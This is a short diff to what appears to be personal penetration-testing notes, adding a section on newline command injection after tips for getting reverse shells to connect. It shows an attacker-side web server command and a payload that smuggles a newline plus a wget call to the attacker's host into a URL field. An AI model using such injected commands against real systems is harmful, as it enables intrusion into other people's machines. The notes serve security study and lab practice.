@@ -750,4 +750,8 @@ how it works:
 >- use the full path for binaries  (ex `/bin/sh`)
 >- use a different port (not 4444) -->  bc something fails
 >	- try common port -->  80/8080/443
->
+
+#### Trigger new line
+`python3 -m http.server 8080` -->  setup a web server from the attacker
+`https://google.com \n wget 172.17.0.1:8080/test`  -->  try to trigger a new line and retrieve 
+                                                   something from the webserver
